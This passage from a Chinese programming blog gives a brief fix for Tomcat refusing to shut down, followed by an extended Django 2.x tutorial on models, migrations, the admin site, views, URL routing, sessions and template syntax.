sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.apache.catalina.startup.Bootstrap.stopServer(Bootstrap.java:400) at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:487)The stop command failed. Attempting to signal the process to stop through OS signal.Tomcat stopped. 解决办法就是修改catalina.sh文件， 12PRGDIR=`dirname &quot;$PRG&quot;` 在这行下面追加内容 12345678if [ -z &quot;$CATALINA_PID&quot; ]; then CATALINA_PID=$PRGDIR/CATALINA_PID cat $CATALINA_PIDfi 然后修改 修改Tomcat bin目录下shutdown.sh文件；最后一句修改为如下 1exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; stop -force &quot;$@&quot; 添加一个参数 -force 1然后在shutdown.sh 把停掉，也可以通过./catalina.sh start 启动， ./catalina.sh stop 停止","link":"/2020/08/05/tomcat%E6%97%A0%E6%B3%95%E5%85%B3%E9%97%AD%E7%9A%84%E9%97%AE%E9%A2%98/"},{"title":"python3之Django","text":"一,Django基础1.安装通过pip安装Django。 在cmd命令行中输入下面代码，然后回车进行下载安装。 123pip install Django==2.2.6 -i https://pypi.tuna.tsinghua.edu.cn/simple some-packagepip install Django #默认是安装最新的pip uninstall Django #卸载 其中2.2.6为版本号，-i和后面是表示使用国内镜像进行下载。 验证安装成功和查看版本 在cmd命令行中输入pip list 1234&gt;&gt;&gt; import django&gt;&gt;&gt; django.get_version()'3.0.6'&gt;&gt;&gt; 2，创建项目123456789101112131415在合适的地方创建目录我命名Django1， cmd进入该目录输入命令django-admin startproject project D:\\py_work\\Django1&gt;tree . /F #查看目录层级目录层级说明 manage.py 一个命令行工具，可以使我们用多种方式对Django项目进行交互 project目录 __init__.py 一个空文件，它告诉Python这个项目应该被看作是一个python包 settings.py 项目的配置文件 urls.py 项目的url声明 wsgi.py 项目与WSGI兼容的web服务器入口 3，Django基本操作基本操作 1、设计表结构12345678910111213141516171819202122232425设计表结构 班级表结构 表名: Grades 字段: 班级名称 gname 成立时间 gdate 女生总数 ggirlnum 男生总数 gboynum 是否删除 isDelete 表学生表结构 表名： students 字段： 学生姓名 sname 学生性别 sgender 学生年龄 sage 学生简介 scontend 所属班级 sgrade 是否删除 isDelete 2、配置数据库12345678910111213141516171819202122232425262728293031配置数据库注意: Django默认使用SQLite数据 在settings.py文件中。通过DATABASES选项进行数据库配置 配置MySQL python3.x安装的是PyMySQL 在__init__.py写入两行代码 import pymysql pymysql.install_as_MySQLdb() 配置mysql格式 DATABASES = { 'default': { 'ENGINE': 'django.db.backends.mysql', #'NAME': os.path.join(BASE_DIR, 'db.sqlite3'), 'NAME':&quot;yichen&quot;, 'USER':&quot;root&quot;, 'PASSWORD':'密码', 'HOST':&quot;localhost&quot;, 'PORT':&quot;3308&quot;, } } 创建应用 在一个项目中可以创建多个应用，每个应用进行一种业务处理 打开黑屏终端进入Django1\\project目录 执行 python manage.py startapp myApp #myApp是自定义的名称 如果报错类似下面这个的文件出问题，就把确认版本的信息注释掉就可以了。 D:\\Python\\lib\\site-packages\\django\\db\\backends\\mysql\\base.py myApp目录说明 admin.py 站点配置 models.py 模型 views.py 视图 3，激活应用12345678910111213激活应用 在setting.py文件中，将myApp应用加入到INSTALLED_APPS选项中 后面添加'myApp' 这个应用名称 INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'myApp', ] 4.定义模型 12345678910111213141516171819202122232425262728概述: 有一个数据表，就对应有一个模型在models.py文件定义模型 引入包 from django.db import models 模型类要继承models.Mode类，所以要映入 from django.db import models# Create your models here.class Grades(models.Model): gname =models.CharField(max_length=20) gdate = models.DateTimeField() ggirlnum = models.IntegerField() gboynum = models.IntegerField() isDelete= models.BooleanField(default=False)class Students(models.Model): sname = models.CharField(max_length=20) sgender = models.BooleanField(default=True) sage = models.IntegerField() scontend = models.CharField(max_length=20) isDelete = models.BooleanField(default=False) #关联外键 #sgrade = models.ForeignKey(&quot;Grades&quot;) sgrade = models.ForeignKey(&quot;Grades&quot;,on_delete=models.CASCADE) 说明: 不需要定义主键，在生成时自动添加，并且值为自动增加的 5.生数据库中生成表 1234567891011121314151617181920212223242526271、生成迁移文件 在project目录下执行命令 python manage.py makemigrations 在migrations目录下生成一个迁移文件，此时数据库中还没有生成数据表。 如果报错on_delete，就需要定义外键的时候加上on_delete=; 即：sgrade = models.ForeignKey(&quot;Grades&quot;,on_delete=models.CASCADE)django 升级到2.0之后,表与表之间关联的时候,必须要写on_delete参数,否则会报异常:TypeError: init() missing 1 required positional argument: ‘on_delete’on_delete各个参数的含义如下：on_delete=None, # 删除关联表中的数据时,当前表与其关联的field的行为 on_delete=models.CASCADE, # 删除关联数据,与之关联也删除 on_delete=models.DO_NOTHING, # 删除关联数据,什么也不做 on_delete=models.PROTECT, # 删除关联数据,引发错误ProtectedError # models.ForeignKey('关联表', on_delete=models.SET_NULL, blank=True, null=True) on_delete=models.SET_NULL, # 删除关联数据,与之关联的值设置为null（前提FK字段需要设置为可空,一对一同理） # models.ForeignKey('关联表', on_delete=models.SET_DEFAULT, default='默认值') on_delete=models.SET_DEFAULT, # 删除关联数据,与之关联的值设置为默认值（前提FK字段需要设置默认值,一对一同理） on_delete=models.SET, # 删除关联数据, a. 与之关联的值设置为指定值,设置：models.SET(值) b. 与之关联的值设置为可执行对象的返回值,设置：models.SET(可执行对象)2、执行迁移 在project目录下执行命令 python manage.py migrate 相当于执行了sql语句创建数据库表 6.测试数据操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051进入到python shell ,执行下面命令进入 python manage.py shell 引入包。 from myApp.models import Grades,Students from django.utils import timezone from datetime import * 查询所有数据 类名.objects.all() Grades.objects.all() 添加数据 本质: 创建一个模型类的对象实例 gradel = Grades() #创建一个对象&gt;&gt;&gt; gradel.gname= &quot;python04&quot;&gt;&gt;&gt; gradel.gdate = datetime(year=2017,month=7,day=17)&gt;&gt;&gt; gradel.ggirlnum = 3&gt;&gt;&gt; gradel.gboynum = 70&gt;&gt;&gt; gradel.save()查询某个对象 类名.obgects.get(pk=id) Grades.objects.get(pk=2) 修改数据 grade2.save()&gt;&gt;&gt; grade2.gboynum = 60&gt;&gt;&gt; grade2.save()删除数据 模型对象.delete() grade2.delete() 注意: 物理删除，数据库中的表里的数据被删除了 关联对象&gt;&gt;&gt; stu = Students()&gt;&gt;&gt; stu.sname=&quot;xueyanmei&quot;&gt;&gt;&gt; stu.ggender=False&gt;&gt;&gt; stu.sage= 20&gt;&gt;&gt; stu.scontend=&quot;my name is xueyanmei&quot;&gt;&gt;&gt; stu.sgrade = gradel&gt;&gt;&gt; stu.save() 获得关联对象的集合 需求: 获取python04班级的所有学生 对象名.关联类名小写_set.all() stu.sgrade =gradel stu.save() gradel.students_set.all() 7.启动服务器 12345678格式: python manage.py runserver ip:port ip可以不写，不写的话代表本机ip 端口号默认是8000 python manage.py runserver 说明: 这是一个纯python写的轻量级web服务器,仅仅在开发测试环境使用。 8.Admin站点管理 123456789101112131415161718概述: 内容发布 负责添加、修改、删除内容 公告访问 配置Admin应用 在settings.py文件中INSTALLED_APPS中添加'django.contrib.admin' 创建管理员用户 python manage.py createsuperuser 输入用户名，默认是administrator , 邮箱，密码123.shui 邮箱顺便乱写就可以。 登录admin页面 http://127.0.0.1:8000/admin/管理页面默认是英文界面，汉化。 修改sttings.py文件里面的 LANGUAGE_CODE = 'en-us' 把值改为zh-Hans TIME_ZONE = 'UTC' 把值改为Asia/Shanghai 然后直接刷新页面就可以，不用重启服务 管理数据表 1234567891011121314151617181920修改admin.py文件 from .models import Grades,Students #注册 admin.site.register(Grades) admin.site.register(Students)然后刷新页面，如果报错就重启服务器。 就会有新增的两张表自定义管理页面 列表页属性 list_display 显示字段 要显示什么字段，就写什么字段。 list_filter 过滤字段 search_fields 搜索字段 list_per_page 分页 添加、修改页属性 fields 属性的先后顺序 fieldsets 给属性分组 注意: fields 与 fieldsets不能同时使用。 admin.py详细内容 1234567891011121314151617181920212223242526272829from django.contrib import admin# Register your models here.from .models import Grades,Students#注册class GradesAdmin(admin.ModelAdmin): #列表页属性 list_display = ['pk','gname','gdate','ggirlnum','gboynum','isDelete'] list_filter = ['gname'] search_fields =['gname'] list_per_page = 5 #添加、修改页属性 #fields = ['ggirlnum','gboynum','gname','gdate','isDelete'] fieldsets = [ (&quot;num&quot;,{&quot;fields&quot;:['ggirlnum','gboynum']}), (&quot;base&quot;,{&quot;fields&quot;:['gname','gdate','isDelete']}), ]admin.site.register(Grades,GradesAdmin)class StudentsAdmin(admin.ModelAdmin): list_display = ['pk','sname','sage','sgender','scontend','sgrade','isDelete'] list_per_page = 2 search_fields = ['sname']admin.site.register(Students,StudentsAdmin) 关联对象 123456需求: 创建一个班级是可以直接添加几个学生 class STudentsInfo(admin.TabularInline) #StackedInline model = STudents extra =2 class GradesAdmin(admin.ModelAdmin) 布尔值显示问题 123456789101112class StudentsAdmin(admin.ModelAdmin): def gender(self): if self.sgender: return &quot;男&quot; else: return &quot;女&quot; #设置页面列的名称 gender.short_description = &quot;性别&quot; list_display = ['pk','sname','sage',gender,'scontend','sgrade','isDelete'] list_per_page = 2 search_fields = ['sname'] 执行动作的位置问题 123#执行动作的位置 actions_on_top = False actions_on_bottom = True 使用装饰器完成注册 123456789101112131415161718@admin.register(Students)class StudentsAdmin(admin.ModelAdmin): def gender(self): if self.sgender: return &quot;男&quot; else: return &quot;女&quot; #设置页面列的名称 gender.short_description = &quot;性别&quot; list_display = ['pk','sname','sage',gender,'scontend','sgrade','isDelete'] list_per_page = 2 search_fields = ['sname'] #执行动作的位置 actions_on_top = False actions_on_bottom = True#admin.site.register(Students,StudentsAdmin) 3,Django视图的基本使用1,概述 1在django中，视图对web请求进行回应，视图就是一个python函数，在views.py文件中定义 2，定义视图 123456789from django.shortcuts import render# Create your views here.from django.http import HttpResponsedef index(request): return HttpResponse(&quot;yichen is a good man&quot;) 3,配置url 1234567891011121314151617181920修改project目录下的urls.py文件from django.contrib import adminfrom django.urls import pathfrom django.conf.urls import url,includeurlpatterns = [ path('admin/', admin.site.urls), url(r'^',include('myApp.urls')),]在myApp目录下新建urls.py文件from django.conf.urls import urlfrom . import viewsurlpatterns = [ url(r'^$',views.index), #执行views目录下的一个index函数。] 4，模板的基本使用1,概述 模板是HTML页面，可以根据视图中传递过来的数据进行填充 2,创建模板 1创建templates目录，在目录下创建对应项目的模板目录(project/templates/myApp) 3,配置模板路径 1234567修改settings文件下的TEMPLATESTEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR,&quot;templates&quot;)], #这里修改目录 'APP_DIRS': True, 4，定义grades.html和students.html模板 123模板语法 {{输出值，可以是变量，一个可以是对象属性}} {%执行代码段%} grades.html模板 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;班级信息&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;班级信息表&lt;/h1&gt;&lt;u1&gt;&lt;!-- --[python04,python05,python06]--&gt; {%for grade in grades%} &lt;li&gt; &lt;a href=&quot;#&quot;&gt;{{grade.gname}}&lt;/a&gt; &lt;/li&gt; {%endfor%}&lt;/u1&gt;&lt;/body&gt;&lt;/html&gt; 定义视图 1234567from .models import Gradesdef grades(request): #去模板里取数据 gradesList = Grades.objects.all() #将数据传递给模板,模板在渲染页面，将渲染好的页面返回浏览器 return render(request, &quot;myApp/grades.html&quot;,{&quot;grades&quot;:gradesList}) 配置url 1234567from . import viewsurlpatterns = [ url(r'^$',views.index), #执行views目录下的一个index函数。 url(r'^(\\d+)/(\\d+)$',views.detail), url(r&quot;^grades/$&quot;,views.grades),] 二，Django模型Django对各种数据库提供了很好的支持，Django为这些数据库提供了统一的API，可以根据不同的业务需求，选择不同的数据库 1，Django模型流程1，配置数据库12345678910111213141516171819 1、修改工程目录下的__init__.py文件 import pymysqlpymysql.install_as_MySQLdb()2、在settings.py文件中。通过DATABASES选项进行数据库配置 配置MySQLDATABASES = { 'default': { 'ENGINE': 'django.db.backends.mysql', #'NAME': os.path.join(BASE_DIR, 'db.sqlite3'), 'NAME':&quot;yichen2&quot;, 'USER':&quot;root&quot;, 'PASSWORD':'123.shui', 'HOST':&quot;localhost&quot;, 'PORT':&quot;3308&quot;, } } 2，开发流程123456789101、配置数据库2、定义模型类 一个模型类都在数据库对应一张数据表3、生成迁移文件 python manage.py makemigrations4、执行迁移生成数据表 python manage.py migrate5、使用模型进行增删改查(crud) 操作 3,ORM12345678910概述 对象 关系 映射任务 根据对象的类型生成表结构 将对象、列表的操作转换为sql语句 将sql语句查询到的结构转换为对象、列表优点 极大的减轻了开发人员的工作量，不需要面对因数据库的变更而改变。 4，定义模型1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321、模型、属性、表、字段间的关系 一个模型类在数据库中对应一张表，在模型类中定义的属性，对应该模型对照表中的一个字段。 2、定义属性概述: 1、django根据属性的类型确定以下信息 1，当前选择的数据库支持字段的类型 2，渲染管理表单时使用的默认html控件 3，在管理站点最低限度的验证 2、django会为表增加自动增长的主键列，每个模型只能有一个主键列，如果使用选项设置某属性为主键列后，则django不会再生成默认的主键列 3、属性命名限制 1,不能是python的保留关键字，遵循标识符规则 2,由于django的查询方式，不允许使用连续的下划线库 定义属性时，需要字段类型，字段类型被定义在django.db.models.fields目录下，为了方便使用，被导入到django.db.models中 使用方式 导入from django.db import models 通过models.Field创建字段类型的对象，赋值给属性 4、逻辑删除 对于重要数据都要做逻辑删除，不做物理删除，实现方法时定义isDelete属性，类型为BooleanField,默认值为False 5、字段类型 AutoField 一个根据实际id自动增长的IntegerField,通常不指定，如果不指定一个主键字段将自动添加到模型中 CharField(max_length=字段长度) 字符串，默认的表单样式是 TextInput TextField 大文本字段，一般超过4000使用，默认的表单控件是Textarea IntegerField 整数 DecimalField(max_digits=None,decimal_places=None) 使用python的Decimal实例表示的十进制浮点数 参数说明 DecimalField.max_digits 位数总数 3.1415926 总数是8 DecimalField.decimal_places 小数点后的数字位数 3.1415926 位数是7 FloatField 用Python的float实例来表示的浮点数 BooleanField true/false 字段，此字段的默认表单控制是CheckboxInput NullBooleanField 支持null、true、false三种值 DateField([auto_now=False, auto_now_add=False]) 使用Python的datetime.date实例表示的日期 参数说明 DateField.auto_now 每次保存对象时，自动设置改字段为当前时间，用于“最后一次修改” 的时间戳，它总是使用当前日期，默认为false DateField.auto_now_add 当前对象第一次被创建时自动设置当前时间，用于创建的时间戳，它总是使用当前时间，默认为false 说明 该字段默认对应的表单控件是一个TextInput,在管理站点添加了一个JavaScript写的日历控件，和一个&quot;Today&quot; 的快捷按钮。包含了一个额外的invalid_date错误消息键。 注意: auto_now_add, auto_now, add default 这些设置是相互排斥的，他们之间的任何组合将发生错误的结果 TimeField 使用Python的datetime.time的实例表示的时间，参数同DateField DateTimeField 使用Python的datetime datetime实例表示的日期和时间，参数同DateField FileField 一个上传文件的字段 ImageField 继承了FileField的所有属性和方法，但对上传的对象进行校验， 确保它是个有效的Image 7、字段选项 概述: 通过字段选项，可以实现对字段的约束 在字段对象时通过关键字参数指定 null 如果为True, Django 将空值以NULL 存储到数据库中，默认值是 False blanke 如果为True, 则该字段允许为空白，默认是False 注意: null是数据库范畴的概念，blank是表单验证范畴的概念 db_column 字段的名称，如果未指定，则使用属性的名称 db_index 若值为True, 则在表中会为此字段创建索引 default 默认值 primary_key 若为True, 则该字段会成为模型的主键字段 unique 如果为True,这个字段在表中必须有唯一值 8、关系 分类 ForeignKey: 一对多，将字段定义在多的端中 ManyToManyField:多对多，将字段定义在两端中， OneToOneField: 一对一，将字段定义在任意一端中 用一访问多 格式 对象.模型类小写_et 示例 grade.students_set 用一访问一 格式 对象.模型类小写 示例 grade.students 访问id 格式 对象.属性_id 示例 student.sgrade_id 创建模型类12345678910111213141516171819202122232425262728293031323334from django.db import models# Create your models here.class Grades(models.Model): gname =models.CharField(max_length=20) gdate = models.DateTimeField() ggirlnum = models.IntegerField() gboynum = models.IntegerField() isDelete= models.BooleanField(default=False) # def __str__(self): # return &quot;%s-%d-%d&quot;%(self.gname,self.ggirlnum,self.gboynum) def __str__(self): return &quot;%s&quot;%(self.gname) class Meta: db_table =&quot;grades&quot;class Students(models.Model): sname = models.CharField(max_length=20) sgender = models.BooleanField(default=True) sage = models.IntegerField(db_column=&quot;age&quot;) scontend = models.CharField(max_length=20) isDelete = models.BooleanField(default=False) #关联外键 #sgrade = models.ForeignKey(&quot;Grades&quot;,on_delete=models.CASCADE) sgrade = models.ForeignKey(&quot;Grades&quot;,on_delete=models.DO_NOTHING ) def __str__(self): return &quot;%s&quot;%(self.sage) lastTime = models.DateTimeField(auto_now=True) createTime = models.DateTimeField(auto_now_add=True) class Meta: db_table =&quot;students&quot; ordering=['id'] 元选项12345678910在模型类中定义Meta类，用于设置 元信息db_table 定义数据表名，推荐使用小写字母，数据表名默认为项目名小写_类名小写 ordering 对象的默认字段排序，获取对象的列表时使用 ordering[id] 升序 ordering[-id] 降序 注意: 排序会增加数据库的开销 模型成员类属性 123456789101112131415161718192021222324252627类属性 objects 是Manager类型的一个对象，作用是与数据库进行交互 当定义模型类是没有指定管理器，则Django为模型创建一个名为objects的管理器 自定义管理器 #自定义模型管理器 #当自定义管理器，objects就不存在了 stuObj = models.Manager() 当为模型指定模型管理器，Django就不在为模型类生成objects模型管理器。 自定义管理器Manager类 模型管理器是Django的模型进行与数据库进行交互的接口，一个模型可以有多个模型管理器 作用 向管理器类中添加额外的方法 修改管理器返回的原始查询集 重新get_queryset()方法 代码示例 class StudentsManager(models.Manager): def get_queryset(self): return super(StudentsManager,self).get_queryset().filter(isDelete=False)class Students(models.Model): # 自定义模型管理器 # 当自定义管理器，objects就不存在了 stuObj = models.Manager() stuObj2 = StudentsManager() 创建对象 12345678910目的 向数据库中添加数据 当创建对象时， django不会对数据库进行读写操作，当调用save()方式时才会与数据库交互，将对象保存到数据库中。注意: __init__方法已经在父类models.Model中使用，在自定义的模式中无法使用。。方法 在模型类中增加一个类方法 在定义管理 模型查询123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105概述 查询集表示从数据库获取的对象集合 查询集可以有多个过滤器 过滤器就是一个函数，基于所给的参数限制查询集结果 从sql角度来说，查询集合select语句等价，过滤器就像where条件 查询集 在管理器上调用过滤器方法返回查询集 查询集经过过滤器诗选后返回新的查询集，所以科研写成链式调用 情性执行， 创建查询集不会带来任何数据的访问，直接调用数据时，才会访问数据 1、直接访问数据的情况 迭代 序列化 与if合用 2、返回查询集的方法称为过滤器 all() 返回查询中的所有数据 filter() 返回符合条件的数据 filter(键=值 键=值) filter(键=值).(键=值) exclude() 过滤掉符合条件的数据 order_by() 排序 values() 一个字典，返回一个列表 3、返回单个数据 get() 返回一个满足条件的对象， 注意: 如果没有找到符合条件的对象，会引发模型类DoesNoteExist异常，如果找到多个对象，会引发模型类MultipleObjectsReturned at异常。 count() 返回当前查询集中的对象个数 first() 返回查询集中的第一个对象 last() 返回查询集中的最后一个对象 exists() 判断查询集中是否有数据，如果有数据返回True,没有数据返回false. 4、限制查询集 查询集返回列表。可以使用下标的方法进行限制，等同于sql中的limit语句 studentList= Students.stuObj2.all()[0:5] 注意: 下标不能是负数 5、查询集的缓存 概述: 每个查询集都包含一个缓存。来最小化的对数据库访问 在新建的查询集中，缓存首次为空，第一次对查询集求值，会发生数据缓存。Django会将查询出来的数据做一个缓存，并返回查询结构，以后的查询直接使用查询缓存。 6、字段查询 概述: 实现了sql中的where语句，作为方法filter(),exclude(),get()的参数 语法 属性名称__比较运算符=值 外键 属性名_id 转义 like语句中使用%是为了匹配占位。匹配数据中的%(where like \\%) 比较运算符: exact 判断。大小写敏感 filter(isDelete=False) contains 是否包含，大小写敏感 ctudentSlist = Students.stuObj2.filter(sname__contains=&quot;sui&quot;) startswith、endswith 以value开头或结尾。大小写敏感 以上四个个在前面加上i,表示不区分大小写，iexact、icontains、istartswith、iendswith。 isnull,isnotnull 是否为空 in 是否包含在范围内 studentsList=Students.stuObj2.filter(pk__in=[2,4,6,8,10]) gt 大于 studentsList=Students.stuObj2.filter(sage__gt=30) gte 大于等于 lt 小于 lte 小于等于 year 年 studentsList=Students.stuObj2.filter(lastTime__year=2017) month 月 day 天 week_day 周 hour 小时 minute 分钟 second 秒 查询快键 pk 代表主键 聚合函数 Count Max Min Sum F对象 可以使用模型的A属性与B属性进行比较 支持F对象的算术运算。 Q对象 概述。过滤器的方法中的关键字参数。条件为And模式 需求 进行or查询 解决 使用Q对象 studentsList = Students.stuObj2.filter(Q(pk__lte=3)|Q(sage__gt=50)) studentsList = Students.stuObj2.filter(Q(pk__lte=3)) 只有一个Q对象，就是用于匹配的。 三、Django视图基础概述 123456789101112131415161、作用： 视图接受web请求，并响应web请求2、本质: 视图就是一个python中的函数3、响应: 1.网页 重定向 错误视图 404 500 400 2.JSON数据4、过程 1.用户在浏览器中输入网址 2.Django获取网址信息，去除ip与端口，获取虚拟路径与文件名 3.url管理器 逐个匹配urlconf 记录视图函数名 4.视图管理器找到对应的视图去执行。返回给浏览器。 1、url配置1234567891011121314151617181920212223242526272829303132333435363738394041421、配置流程 制定跟级url配置文件 在setting.py文件中的这里面。 ROOT_URLCONF = 'project.urls' 默认已经配置好了。 urlpatterns 一个url实例的列表 url对象。url(r'^students/$',views.students), 正则表达式 视图名称 名称 url匹配正则的注意事项 如果想要从url中获取一个值。需要对正则加小阔号。 匹配正则前方不需要加斜杠/ 正则前需要加r表示字符串不转义。2、引入其他url配置 在应用中创建urls.py文件，定义本应用的url配置，在工程中urls.py文件中使用include()方法project/urls.py文件from django.contrib import adminfrom django.urls import pathfrom django.conf.urls import url,includeurlpatterns = [ path('admin/', admin.site.urls), url(r'^', include(('myApp.urls','myApp'),namespace=&quot;myApp&quot;)),]myApp/urls.py文件。from django.conf.urls import url,includefrom . import viewsurlpatterns = [ url(r'^$', views.index,name=&quot;index&quot;), url(r'^students/$',views.students), url(r'^addstudent/$',views.addstudent),] 1.url的反向解析1234567概述 如果在视图、模板中使用了硬编码连接。在url配置发生改变时。动态生成连接的地址解决 在使用链接时，通过url配置的名称，动态生成url地址作用 使用url模板 2，视图函数1.定义视图 123456本质: 一个函数视图参数: 一个HttpRequest的实例 通过正则表达式获取的参数位置: 一般在views.py文件下定义 2.错误视图 12345678910111213404视图 找不到网页url匹配不成功的视图 在templates目录下定义404.html request_path 导致错误的网址。 配置settings.py文件 DEBUG = False 如果为True永远不会调用404.html页面。 ALLOWED_HOSTS = [&quot;*&quot;] 400视图 错误出现在客户的操作 500视图 在视图代码中出现错误(服务器代码) 3，HttpRequest对象概述 123服务器接收http请求后，会根据报文创建httpRequest对象视图的第一个参数就是httpRequest对象。django创建的。之后调用视图时传递给视图 属性 1234567891011121314151617181920212223path 请求的完整路径(不包括域名和端口)method 表示请求的方式，常用的有get、post encoding 表示浏览器提交的数据的编码方式 一般为utf-8,GET 类似字典的对象，包含了get请求的所有参数POST 类似字典的对象，包含了post请求的所有参数 FILES 类似字典的对象，包含了所有上传额文件COOKIES 字典，包含了所有的cookie session 类似字典的对象，表示当前会话。 方法 12is_ajax() 如果是通过XMHttpReauest发起的，返回True QueryDict对象 123456789request对象中的GET、POST都属于QueryDict对象方法 get() 作用：根据键获取值 只能获取一个值 getlist() 将键的值以列表的形式返回 只能获取一个值 get属性 12http://127.0.0.1:8000/get1?a=1&amp;b=2c=3http://127.0.0.1:8000/get2?a=1&amp;b=2c=3 post属性 1使用表单实现post请求。 HttpResponse对象 1234567891011121314151617181920212223242526272829303132333435363738394041424344概述 作用: 给浏览器返回数据 HttpRequest对象时有Django创建，HttpResponse对象有程序员创建。 返回用法: 不调用模板， def index(request): return HttpResponse(&quot;yichen2 is a good man&quot;) 调用模板 使用render方法。 原型 render(request, templateName[context]) 作用 结合页面数据和模板，返回完整的HTML页面 参数 request 请求体对象 templateName 模板路径 context 传递给需要渲染在模型上的数据。 属性 content 表示返回的内容 charset 编码格式 status_code 响应的状态码 200 304 404 等等 content-type 指定输出的mimr类型 方法 init 使用页面的内容实例化HttpReponse对象 write(content) 以文本的形式写入。 flush() 以文本的形式输出缓冲区 set_cookie(key,value=&quot;&quot;,max_age=None,exprise=None) delete_cookie(key) 删除cookie 注意: 如果删除一个不存在的key,就当什么都没有发生 子类HttpResponseRedirect 功能，重定向 ，服务器端跳转。 简写： 子类JsonResponse 返回json数据，一般用于异步请求 状态保持 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253http协议是无状态的，每次请求都是一次新的请求。不记得以前的请求客户端与服务端的一次通信就是一次会话实现状态保持，在客户端或者服务端存储有关会话的数据存储方式 cookie 所有的数据存储在客户端，不要存敏感的数据 seesion 所有的数据存储在服务端，在客户端用cookie存储在session_id状态保持的目的 在一段时间内跟踪请求者的状态，可以实现跨页面访问当前的请求者的数据 注意: 不同的请求者之间不会共享这个数据，与请求一一对应的。启用seesion settings文件中。 INSTALLED_APPS 'django.contrib.sessions', 默认是启用的 MIDDLEWARE 'django.contrib.sessions.middleware.SessionMiddleware',默认是启用的。 使用session 启用session后，每个HttpRequest对象都有一个session属性，就是一个类似字典的 get(key,default=None) 根据键获取session值。 clear() 清空所有的会话 flush() 删除当前的会话并删除会话的cookie 设置过期时间 set_expity(value) 如果不设置，两个星期过期 request.session.get_expiry(10) #表示10秒后过期 时间对象 0 关闭浏览器时失效。 None 永不过期。 存储session的位置 数据库: 默认存储在数据库中 django_session; SESSION_ENGINE='django.contrib.session.backends.' 缓存: 只存储在本地内存中，如果丢失不能找回，比数据库快 SESSION_ENGINE='django.contrib.session.backends.cache' 数据库和缓存: 优先从本地存储中读取，读取不到再去数据库中获取。 SESSION_ENGINE='django.contrib.session.backends.cached_db' 使用redis缓存session pip install django-redis-sessions SESSION_ENGINE='redis_sessions.session' SESSION_REDIS_HOST='localhost' SESSION_REDIS_PORT=6379 SESSION_REDIS_DB=0 SESSION_REDIS_PASSWORD='123.yichen' SESSION_REDIS_PREFIX='session' 四、Django中的模板templates 1,定义模板1，变量123456789变量 视图传递给模板的数据 要遵循标识符规则 语法 {{var}} 注意:如果使用的变量不存在，则插入的是空字符串。 在模板使用点语法 字典查询 属性或者方法 数字索引 在模板中调用对象的方法。 注意: 在模板中不能传递参数。 2,标签123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869标签 语法: {%tag%} 作用: 在输出中创建文本 控制逻辑和循环 if: 格式 {% if 表达式 %} 语句 {%endif %} {%if 表达式1%} 语句1 {%else%} 语句2 {%endif%} {%if 表达式1%} 语句1 {%elif 表达式2%} 语句2 {%elif 表达式n %} 语句n {%else%} 语句e {%endif%} 示例 {%if num %} &lt;h1&gt;yichen is a good man&lt;/h1&gt; {%endif%} for: 格式 {%for 变量 in 列表%} 语句 {% endfor%} 格式2 {%for 变量 in 列表%} 语句1 {% empty%} 语句2 {% endfor%} 注意: 列表为空或者不存在时执行语句2 {{forloop.counter}} ,表示当前是第几次循环。 comment: 注释多行 {%comment%} 注释的内容 {%endcomment%} ifequal、ifnotequal: 判断是否相等或者不相等 格式: {%ifequal 值1 值2 %} 语句 如果值相等，则执行里面的内容 {% endifequal%} include: 作用 加载模板并以标签内的参数渲染 格式: {% include 模板目录 参数1 参数2 %} url: 作用: 反向解析 格式: {%url 'namespace:name' p1 p2%} csrf_token: 作用: 用于跨站请求伪造保护 格式:{% csrf_token%} block、extends: 作用 用于模板的继承 autoescape: 作用 用于HTML转义 3,过滤器123456789101112131415161718192021222324252627282930过滤器 语法 {{var|过滤器}} 作用， 在变量被显示之前修改它。 lower 小写 upper 大写 过滤器可以传递参数，参数用引号引起来 join 格式 列表|join:'#' 示例 &lt;h1&gt;{{list|join:'#'}}&lt;/h1&gt; 如果一个变量没有被提供，或者值为false,空、可以使用默认值 default 格式 {{var|default:'good'}} 示例 &lt;h1&gt;{{test|default:'没有'}}&lt;/h1&gt; 根据给定格式转换日期为字符串 date 格式: {{dateval|date:'y-m-d'}} HTML转义 escape 加减乘除 示例:&lt;h1&gt;num ={{num}}&lt;/h1&gt;&lt;h1&gt;{{num|add:10}}&lt;/h1&gt;&lt;h1&gt;{{num|add:-5}}&lt;/h1&gt;&lt;!--num/1*5--&gt;&lt;!--num * 5--&gt;&lt;h1&gt;{% widthratio num 1 5 %}&lt;/h1&gt;&lt;!--num /5 --&gt;&lt;h1&gt;{% widthratio num 5 1 %}&lt;/h1&gt; 4,注释123456789注释 单行注释 语法 {# 注释内容 #} 多行注释 comment: 注释多行 {%comment%} 注释的内容 {%endcomment%} 5，反向解析1234567891011url: 作用: 反向解析 格式: {%url 'namespace:name' p1 p2%}project\\urls.py文件url(r'^',include('myApp.urls',namespace='app'))project\\myApp\\urls.py 文件url(r'^good/(\\d+)/$', views.good,name=&quot;good&quot;),index.html代码文件&lt;a href=&quot;{% url 'app:good' 1 %}&quot;&gt;链接&lt;/a&gt; 6,模板继承12345678910111213作用 模板继承可以减少页面的内容的重复定义，实现页面的重用 block标签 在父模板中预留区域，子模板去填充 语法: {% block 标签名 %} {% endblock 标签名 %}extends标签 